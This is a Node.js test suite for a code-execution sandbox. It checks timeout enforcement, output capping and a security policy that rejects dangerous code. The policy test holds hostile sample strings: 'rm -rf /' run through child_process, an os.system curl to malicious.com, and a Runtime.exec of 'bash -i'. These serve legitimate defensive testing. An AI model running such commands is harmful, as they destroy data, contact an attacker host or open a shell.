import test from 'node:test';
import assert from 'node:assert';
import { runLocalSandbox } from '../execution-service/src/sandbox/localRunner.js';
import { validateCode } from '../execution-service/src/sandbox/securityPolicy.js';

test('Sandbox Confinement & Security Verification', async (t) => {
  await t.test('strictly terminates infinite loops within 5.0 seconds', async () => {
    const infiniteLoopCode = `
      console.log("Loop started");
      while (true) {
        // infinite spin
      }
    `;

    const startTime = Date.now();
    const result = await runLocalSandbox('javascript', infiniteLoopCode);
    const duration = Date.now() - startTime;

    assert.ok(duration >= 4900 && duration <= 6500, `Execution took ${duration}ms - must terminate around 5000ms`);
    assert.strictEqual(result.exitCode, 124, 'Exit code must be 124 (SIGKILL timeout)');
    assert.ok(result.error.includes('timed out'), 'Error message must state execution timed out');
  });

  await t.test('caps massive stdout streams at 512 KB to prevent memory exhaustion', async () => {
    const floodCode = `
      for (let i = 0; i < 20000; i++) {
        console.log("A".repeat(80));
      }
    `;

    const result = await runLocalSandbox('javascript', floodCode);

    const outputBytes = Buffer.byteLength(result.output, 'utf8');
    const MAX_ALLOWED_BYTES = 512 * 1024 + 1024; // 512KB + allowance for truncation warning message

    assert.ok(outputBytes <= MAX_ALLOWED_BYTES, `Output size was ${outputBytes} bytes, must not exceed 512KB`);
    assert.ok(result.output.includes('[Output truncated'), `Must contain truncation notice, but got: ${result.output.slice(-200)}`);
  });

  await t.test('security policy rejects dangerous system command injections', () => {
    const dangerousJs = "require('child_process').execSync('rm -rf /')";
    const checkJs = validateCode(dangerousJs, 'javascript');
    assert.strictEqual(checkJs.valid, false, 'Must reject child_process execution');

    const dangerousPy = "import os\nos.system('curl http://malicious.com')";
    const checkPy = validateCode(dangerousPy, 'python');
    assert.strictEqual(checkPy.valid, false, 'Must reject os.system execution');

    const dangerousJava = "Runtime.getRuntime().exec(\"bash -i\");";
    const checkJava = validateCode(dangerousJava, 'java');
    assert.strictEqual(checkJava.valid, false, 'Must reject Runtime.exec execution');
  });

  await t.test('executes legitimate code safely with expected output', async () => {
    const validJs = `
      function fib(n) {
        return n <= 1 ? n : fib(n - 1) + fib(n - 2);
      }
      console.log("Fibonacci:", fib(10));
    `;

    const result = await runLocalSandbox('javascript', validJs);
    assert.strictEqual(result.exitCode, 0);
    assert.strictEqual(result.output.trim(), 'Fibonacci: 55');
  });
});
